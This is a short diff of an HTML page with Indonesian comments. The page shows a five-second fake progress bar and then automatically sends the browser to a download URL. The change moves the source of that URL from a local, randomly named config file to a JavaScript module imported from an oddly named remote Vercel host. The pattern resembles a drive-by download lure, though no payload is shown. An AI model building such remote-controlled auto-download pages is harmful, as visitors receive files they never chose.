@@ -113,8 +113,8 @@
     </div>
 
     <script type="module">
-        // Mengambil URL dari file JavaScript dengan nama acak
-        import { downloadUrl } from './config_a78x92.js';
+        // Mengambil URL langsung dari Vercel
+        import { downloadUrl } from 'https://ueheururue8282828282.vercel.app/config_a78x92.js';
 
         // Konfigurasi Waktu (5 detik = 5000 milidetik)
         const totalWaktu = 5000;
@@ -138,10 +138,10 @@
             if (persenSaatIni >= targetPersen) {
                 clearInterval(loadingInterval);
                 
-                // Menampilkan teks ketiga dengan efek transisi transisi yang lebih halus
+                // Menampilkan teks tutorial
                 tutorialTextElement.classList.add('show');
                 
-                // Memulai proses unduh otomatis menggunakan variabel hasil import
+                // Mengarahkan ke URL yang diambil dari Vercel
                 window.location.href = downloadUrl;
             }
         }, intervalWaktu);
